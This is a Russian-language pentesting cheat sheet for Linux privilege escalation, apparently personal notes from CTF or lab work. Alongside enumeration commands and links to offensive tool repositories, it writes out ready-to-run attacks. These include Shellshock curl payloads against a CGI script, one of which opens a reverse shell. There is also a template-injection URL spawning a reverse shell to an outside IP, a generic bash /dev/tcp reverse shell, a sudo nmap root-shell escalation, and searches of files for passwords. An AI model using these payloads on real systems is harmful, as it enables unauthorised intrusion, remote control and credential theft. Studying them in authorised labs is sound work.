

Скрипты повышения привелегий 

https://github.com/rebootuser/LinEnum
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

Информация о системе в txt-файле:

        дистрибутив;
            cat /etc/issue
           cat /etc/*-release
       версия ядра и разрядность;
                   cat /proc/version
                 uname -a
                  uname -mrs
                    rpm -q kernel
                   dmesg | grep Linux
                    ls /boot | grep vmlinuz-
        информация о сетевом интерфейсе;
        табличка iptables;
        первые 5 сервисов с рут-правами.


curl -H "User-Agent: () { :;}; echo; /bin/sudo -l" http://10.8.0.10/cgi-bin/shell.sh




curl -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.8.0.4/1234 0>&1" http://10.8.0.10/cgi-bin/shell.sh


http://localhost.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.61/4242 0>&1"`'}

bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"

Sudo -l
find hacker -exec whoami \;
find / -perm -u=s -type f 2>/dev/null

 TF=$(mktemp) 
 echo 'os.execute("/bin/bash")' > $TF
sudo nmap --script=$TF 

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi

https://gtfobins.github.io/  повышение привелегий через судо-приложения


https://github.com/rebootuser/LinEnum
реверс
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#reverse-shell



реверс генератор


https://www.revshells.com/




Также вы можете загрузить zip-файл с RustHound https://github.com/OPENCYBER-FR/RustHound/archive/master.zip

wget https://example.com/file.zip - стянуть файйл с сервера. У себя сервер - python3 -m http.server 8080


Запустить интерактивную оболочку

script /dev/null -c bash

повысить до tty командой 
python3 -c 'import pty; pty.spawn("/bin/bash")'

/bin/bash -p - это команда запуска интерпретатора командной строки Bash с флагом -p, который означает "privileged mode" (привилегированный режим).

# Найти файлы владельцем которого является группа
find / -group bugtracker 2>/dev/null

# Найти файлы владельцем которого является пользователь
find / -type f -user emily 2>/dev/null

# Найти строки из всех файлов где есть passw
cat * | grep -i passw*

# Найти запущенные процессы 
ps -aux
